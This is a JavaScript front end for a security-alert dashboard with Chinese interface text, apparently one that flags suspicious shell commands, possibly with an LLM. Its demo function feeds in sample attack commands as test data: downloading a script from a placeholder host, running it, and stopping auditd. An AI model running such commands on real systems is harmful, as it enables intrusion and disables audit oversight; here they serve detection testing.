const $=id=>document.getElementById(id);
let activeAlert=null, refreshing=false;
async function api(path,options={}){
  const r=await fetch('/api/v1/'+path,{...options,headers:{'Authorization':'Bearer '+$('token').value,'Content-Type':'application/json'}});
  if(!r.ok)throw new Error('请求失败 '+r.status+': '+(await r.text()).slice(0,200));
  return r.json();
}
function message(text){$('message').textContent=text;}
function demo(){const session='demo-'+crypto.randomUUID();return {events:['whoami','curl https://example.invalid/agent.sh -o /tmp/agent.sh','chmod +x /tmp/agent.sh','/tmp/agent.sh','systemctl stop auditd'].map((command,i)=>({source_id:'demo',event_id:session+'-'+i,session_id:session,actor_id:'operator-demo',asset_id:'prod-payment-demo',event_time:new Date(Date.now()+i).toISOString(),command,exit_code:0}))};}
async function refresh(){
 if(refreshing)return;refreshing=true;
 try{
  const [events,alerts,jobs]=await Promise.all([api('events'),api('alerts'),api('jobs')]);
  $('eventCount').textContent=events.length;$('alertCount').textContent=alerts.filter(a=>['open','acknowledged'].includes(a.status)).length;
  $('doneCount').textContent=jobs.filter(j=>j.status==='done').length;$('failCount').textContent=jobs.filter(j=>j.status==='failed').length;
  $('events').replaceChildren(...events.map(e=>{const tr=document.createElement('tr');[e.id+' / '+e.event_time,e.actor_id+' / '+e.asset_id,e.command,e.exit_code===null?'未知':String(e.exit_code)].forEach(v=>{const td=document.createElement('td');td.textContent=v;tr.append(td)});return tr}));
  $('alerts').replaceChildren(...alerts.map(a=>{const b=document.createElement('button');b.className='alert '+a.severity;b.textContent=`[${a.severity.toUpperCase()}] ${a.title}  ·  ${a.status}`;b.onclick=()=>showDetail(a.id);return b}));
  if(!alerts.length)$('alerts').textContent='暂无告警。可导入演示日志体验检测流程。';
  message('已更新 '+new Date().toLocaleTimeString());
 }catch(e){message(e.message)}finally{refreshing=false}
}
async function showDetail(id){try{activeAlert=id;$('detailText').textContent=JSON.stringify(await api('alerts/'+id),null,2);$('comment').value='';if(!$('detail').open)$('detail').showModal()}catch(e){message(e.message)}}
$('connect').onclick=refresh;
$('demo').onclick=async()=>{try{const data=demo();$('payload').value=JSON.stringify(data,null,2);await api('events/batch',{method:'POST',body:JSON.stringify(data)});await refresh()}catch(e){message(e.message)}};
$('submit').onclick=async()=>{try{const data=JSON.parse($('payload').value);const r=await api('events/batch',{method:'POST',body:JSON.stringify(data)});await refresh();message(`已接收 ${r.accepted} 条，重复 ${r.duplicates} 条`)}catch(e){message(e.message)}};
$('close').onclick=()=>$('detail').close();
$('feedback').onclick=async()=>{try{await api('alerts/'+activeAlert+'/feedback',{method:'POST',body:JSON.stringify({status:$('status').value,comment:$('comment').value})});$('detail').close();await refresh()}catch(e){message(e.message)}};
$('payload').value=JSON.stringify(demo(),null,2);
fetch('/health').then(r=>r.json()).then(x=>{$('mode').textContent=x.llm_mode==='mock'?'MOCK · 模拟模式':'LLM · 模型模式'}).catch(()=>{$('mode').textContent='离线'});
refresh();setInterval(refresh,3000);
